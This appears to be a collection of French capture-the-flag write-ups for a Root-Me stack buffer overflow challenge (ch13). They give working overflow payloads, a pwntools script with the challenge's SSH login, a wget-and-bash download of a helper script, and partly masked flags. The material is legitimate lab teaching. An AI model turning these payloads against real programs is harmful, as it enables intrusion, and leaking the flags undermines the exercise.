@@ -1,0 +1,279 @@
+En lisant le code source, on comprend aisément qu’il faut remplacer la valeur de check grâce à la différence de taille de check (40) et la taille de lecture de fgets (45 - 1 à cause du ’\0’)
+Le problème c’est que 0xdeadbeef est une adresse en héxa sur 4 octets et qu’on ne peut entrer que de l’ascii au clavier.
+Comment entrer de l’hexadécimal durant l’exécution d’un programme ?
+
+echo -ne "azertyuiopazertyuiopazertyuiopazertyuiop\xEF\xBE\xAD\xDE"
+
+J’ai simplement recopié la sortie de cette commande dans la saisie du binary ce qui ne marchait pas.
+J’ai fini par découvrir qu’on pouvait rediriger l’entrée standard vers le programme lui-même.
+
+A partir de là, c’est facile. Soit on le fait avec python comme dans les autres solutions, soit on passe par un fichier temporaire :
+
+echo -ne "azertyuiopazertyuiopazertyuiopazertyuiop\xEF\xBE\xAD\xDE" > /tmp/toto
+
+Ce n’est pas très élégant mais ça marche.
+
+Enfin, on pense avoir fini en exécutant le binary :
+cat /tmp/toto |./binary13
+
+mais on ne voit pas le terminal qui est supposé s’ouvrir après le message Yeah Dude car la commande cat finit la lecture du fichier avec un EOF.
+
+Une astuce que j’ai fini par découvrir sur http://mywiki.wooledge.org/BashGuide/InputAndOutput?#Here_Strings
+On peut concatener un fichier avec stdin ce qui permet d’éviter le caractère EOF.
+
+La nouvelle commande est donc
+cat /tmp/toto - |./binary13
+
+whoami répond :
+>binary13cracked
+Un petit "cat .passwd"
+Et on obtient le sésame tant convoité.
+
+ou
+
+La faille se trouve ici :
+
+    char buf[40];
+    fgets(buf,45,stdin);
+
+Télécharger
+
+En augmentant progressivement la taille du string passé en stdin (ou bien en automatisant la tâche avec le module metasploit pattern_create) on se rend bien compte que après le 40ème caractère on commence à écrire dans la variable check.
+
+En prenant en compte les inversions des octets (petit boutien) on prépare le payload :
+
+    echo aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa$(printf '\xef\xbe\xad\xde') > /tmp/payload.txt
+
+Enfin, on utilise cat pour injecter le payload et on rajoute le - pour garder la main sur le stdin :
+
+    cat /tmp/payload.txt - | ./binary13
+     
+    [buf]: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaﾭ
+    [check] 0xdeadbeef
+    Yeah dude ! You win !
+    cat .passwd
+
+ou
+
+En analysant le code source fourni, on se rend vite compte que la fonction fgets() va lire 44 caractères (plus le char 0x00 de fin de chaîne) dans un buffer de 40 octets, ce qui risque d’aller écraser la pile juste en dessous de ce buffer. La pile fonctionnant à l’envers, c’est la variable check qui va être écrasé (ainsi qu’un octet de la variable var).
+
+On se rappel aussi que l’on doit écrire la valeur hexa à l’envers dans la chaîne, car nous sommes sur une architecture qui stocke les entiers avec octet de poids fort en premier.
+
+On sort donc notre interpréteur python pour lui faire cracher la chaîne qu’il nous faut :
+
+    python -c "print 'A'*40+'\xef\xbe\xad\xde'"
+
+On envoi tout ça au binaire en espérant avoir la main sur le shell :
+
+    python -c "print 'A'*40+'\xef\xbe\xad\xde'" | ./binary13
+
+Ça nous donne ça :
+
+[buf]: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ
+[check] 0xdeadbeef
+Yeah dude ! You win !
+binary13@challenge02:~$ 
+
+Ça fonctionne, mais on a pas la main.
+On se dit alors qu’on va mettre la commande qu’on veut directement à la suite :
+
+    python -c "print 'A'*40+'\xef\xbe\xad\xdecat .passwd'" | ./binary13
+
+Ça ne fonctionne pas mieux.
+Alors, on cherche un peu partout sur le net, et on arrive à comprendre que le shell ne reçois pas ce qu’on lui envoi, parce que binary13 à déjà tout mangé (buffering), on trouve aussi que le fameux buffer fait 4K (on peut le trouver en expérimentant quelques chaines).
+
+Comme notre binaire va lire 24 octet, il faut envoyer (4096 - 24 = 4052) caractère à la suite avant notre commande pour que le binaire ne ’mange’ pas la commande, ce qui nous donne ça :
+
+    python -c "print 'A'*40+'\xef\xbe\xad\xde'+'A'*4052+'cat .passwd'" | ./binary13
+
+Bingo !
+
+ou
+
+    int check = 0x04030201;
+    char buf[40];
+    fgets(buf,45,stdin);
+
+Télécharger
+
+La faille se situe dans la fonction fgets qui peut enregistrer jusqu’à 45 caractères dans buf qui ne peut en contenir que 40. en dépassant sa taille buf va écrire dans check.
+
+if (check == 0xdeadbeef)
+
+Il faut que check contienne "0xdeadbeef" pour obtenir le shell.
+
+on vérifie quand même à quel moment on écrase check grâce à metasploit et son pattern_create.
+on obtient 40 comme prévu.
+
+on construit notre exploit :
+python -c 'print "A"*40 +"\xef\xbe\xad\xde"' | ./binary13
+
+On a la phrase « Yeah dude ! You win ! » mais pas le shell..
+on va donc bloquer l’exécution avec cat.
+
+    (python -c 'print "A"*40 +"\xef\xbe\xad\xde"' ;cat) | ./binary13
+    $ id
+    uid=1046(binary13) gid=1046(binary13) euid=1047(binary13cracked) groups=1047(binary13cracked),100(users),1046(binary13)
+
+ou
+
+
+La méthode suivante est une alternative moins élégante que les autres pour cette solution, mais quand même intéressante dans d’autres situations :
+
+    En regardant le code, on voit tout de suite une disparité entre la taille allouée du buffer (40) et la taille que l’utilisateur peut fournir avec fgets (45). C’est cette différence qu’on va exploiter.
+    On ne contrôle que 5 bytes, donc inutile de tenter d’injecter du shellcode, ni de faire du ret2libc...
+    On a juste assez de place pour ré-écrire le mot au-dessus, c.à.d. check. N’oublions pas l’endianess :
+    python -c 'print "a" * 40 + '\xef\xbe\xad\xde' | ./ch13"
+    Jusqu’ici tout va bien... Mais c’est pas la chute qui compte, c’est l’atterrisage. "/bin/dash" s’execute... mais on a un EOF dans notre pipe, donc le programme se termine sans qu’on puisse entrer de commandes.
+
+L’astuce finale est donc d’éviter l’EOF. Pour cela, on peut faire usage des FIFO (https://en.wikipedia.org/wiki/Named_pipe). Par exemple :
+
+    (Fenêtre 1)
+    mkfifo /tmp/pipe
+    tail -f /tmp/pipe | ./ch13
+     
+    (Fenêtre 2)
+    python -c "print 'a'*40 + '\xef\xbe\xad\xde'">>/tmp/pipe
+    echo "cat .passwd">>/tmp/pipe
+
+Télécharger
+
+En utilisant ’screen’ (qui est installé sur le serveur), on peut effectuer la manip avec une seule séance SSH.
+
+ou
+
+Voici mon raisonnement pour cette épreuve :
+
+- Je vois un buffer de 40
+- Utilisation de fgets() qui ne check pas la taille
+- Le if (check == 0xdeadbeef) à respecter
+- Mémoire alignée sur : 16 (execution dans /tmp)
+
+$ wget https://raw.githubusercontent.com/notfound-404/BASH-memory_offset/master/memory_offset.sh
+$ bash memory_offset.sh
+
+[+] K2j9Gl.c created
+[+] Calcul in progress
+[+] Memory offset => 16
+[+] K2j9Gl.c and K2j9Gl have been removed
+
+
+- Donc 40 + size(address) = 48 (va bene pour l’alignement sur 16)
+- Y’a plus qu’à !
+
+$ { python -c 'import struct
+> p = struct.pack("<L",0xdeadbeef)
+> print "A"*40+p'
+> cat; } | ./binary13
+
+On exécute le payload :
+
+[buf]: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭÞ
+[check] 0xdeadbeef
+Yeah dude ! You win !
+id
+uid=1046(binary13) gid=1046(binary13) euid=1047(binary13cracked) groupes=1047(binary13cracked),100(users),1046(binary13)
+cat .passwd
+1w4//..//np1
+
+Enjoy :)
+
+Lien utile :
+https://github.com/notfound-404/BASH-memory_offset
+
+ou
+
+On commence par chercher, si on remplit la pile, ce qui est lu et contenu dans la variable "check" :
+if (check == 0xdeadbeef)
+
+On teste ceci :
+
+    #! /usr/bin/env python3
+    import pwn
+     
+    s = pwn.ssh('app-systeme-ch13',
+                'challenge02.root-me.org',
+                password='app-systeme-ch13',
+                port=2222)
+     
+    #s.interactive()
+    p = s.process('ch13')
+    p.sendline(pwn.cyclic(300))
+    print(p.recvline())
+    print(p.recvline())
+    print(p.recvline())
+    print(p.recvline())
+    p.close()
+    s.close()
+
+Télécharger
+
+On obtient :
+
+[+] Connecting to challenge02.root-me.org on port 2222: Done
+[+] Opening new channel: execve(b'ch13', [b'ch13'], os.environ): Done
+b'\n'
+b'[buf]: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaa\n'
+b'[check] 0x6161616b\n'
+b'\n'
+[*] Closed SSH channel with challenge02.root-me.org
+[*] Closed connection to 'challenge02.root-me.org'
+
+On sait alors qu’il faut écrire 0xdeadbeef à la place de 0x6161616b
+Donc :
+
+    #! /usr/bin/env python3
+    import pwn
+     
+    s = pwn.ssh('app-systeme-ch13',
+                'challenge02.root-me.org',
+                password='app-systeme-ch13',
+                port=2222)
+     
+    #s.interactive()
+    p = s.process('ch13')
+    n = pwn.cyclic_find(0x6161616b)
+    p.sendline((b'A'*n)[:n]+pwn.p32(0xdeadbeef))
+    p.sendline(b'cat .passwd')
+    print(p.recvline())
+    print(p.recvline())
+    print(p.recvline())
+    print(p.recvline())
+    print(p.recvline())
+    print(p.recvline())
+    p.close()
+    s.close()
+
+Télécharger
+
+On obtient :
+
+[+] Connecting to challenge02.root-me.org on port 2222: Done
+[+] Opening new channel: execve(b'ch13', [b'ch13'], os.environ): Done
+b'\n'
+b'[buf]: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde\n'
+b'[check] 0xdeadbeef\n'
+b'Yeah dude! You win!\n'
+b'Opening your shell...\n'
+b'$ 1w4ntm0r3pr0****\n'
+[*] Closed SSH channel with challenge02.root-me.org
+[*] Closed connection to 'challenge02.root-me.org'
+
+ou
+
+Ma solution pour le début du challenge est similaire à toutes les autre.
+Par contre, pour accéder au flag et contourner le fait qu’on ne reste pas dans le shell, j’ai utilisé une autre technique en utilisant la variable d’environnement BASH_ENV
+
+mkdir /tmp/mych13
+echo "cat .passwd" > /tmp/mych13/startup.sh
+export BASH_ENV=/tmp/mych13/startup.sh
+echo -e "0000000000000000000000000000000000000000\xef\xbe\xad\xde" | ./ch13
+
+et on récupère bien le flag car startup.sh est executé au moment de la commande system("/bin/bash") et on sort donc le flag :
+
+[buf]: 0000000000000000000000000000000000000000ﾭ
+[check] 0xdeadbeef
+Yeah dude! You win!
+Opening your shell...
+1w*****1s
+Shell closed! Bye.
